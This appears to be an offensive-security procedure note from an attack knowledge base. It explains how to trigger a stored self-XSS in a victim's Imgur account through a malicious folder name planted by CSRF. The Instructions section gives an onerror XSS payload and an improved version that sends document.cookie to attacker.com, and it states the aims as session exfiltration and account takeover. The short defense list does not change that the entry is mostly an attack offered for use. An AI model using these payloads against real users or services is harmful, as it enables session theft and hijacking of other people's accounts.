---
id: proc-imgur-trigger-xss
tags:
  - xss
  - trigger
  - account-hijacking
type: procedure
tools:
  - '[[tools/browser-based-exploitation]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/xss-payload-folder-name]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:57.795Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger XSS via Image Addition

## Summary

This procedure executes the stored self-XSS payload in a victim's Imgur session by having them add an image to the malicious folder created earlier via CSRF.

## Description

Once the folder with XSS name exists, normal user actions like favoriting and adding images to folders render the name unsafely, triggering JS execution. This can steal cookies, redirect, or perform other actions in the authenticated context, leading to takeover. Relies on the victim performing routine tasks post-CSFR creation.

## Requirements

1. Malicious folder already created in victim's account
2. Victim authenticated and using Imgur web interface
3. Access to an image for the victim to add

## Defense

Defensive measures and detection strategies:

- Strict input validation on folder interactions
- JS sandboxing or no-execute policies
- User education on anomalous alerts during image management

## Objectives

1. Execute arbitrary JS in victim context
2. Exfiltrate session data for hijacking
3. Chain with social engineering for persistence

## Instructions

### Step 1: Wait for Victim Interaction

**Context**: The trigger occurs passively when the victim adds an image.

**Instructions**: No direct action; monitor if possible. The payload from [[commands/xss-payload-folder-name]] is already stored:

```html
1"'><img src=x onerror=prompt(1)>
```

> Expected output: When victim selects the folder during image addition, JS executes (e.g., prompt or custom code like document.cookie exfil).

### Step 2: Enhance Payload for Hijacking

**Context**: Customize the payload for real impact.

**Command** ([[commands/xss-payload-folder-name]]):
```javascript
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)>
```

> Replace prompt with exfil code. Expected output: Data sent to attacker server on trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/xss-payload-folder-name]]

## Tools Used

- [[tools/browser-based-exploitation]]

## Tags

- [[xss]]
- [[Execution]]
- [[hijacking]]
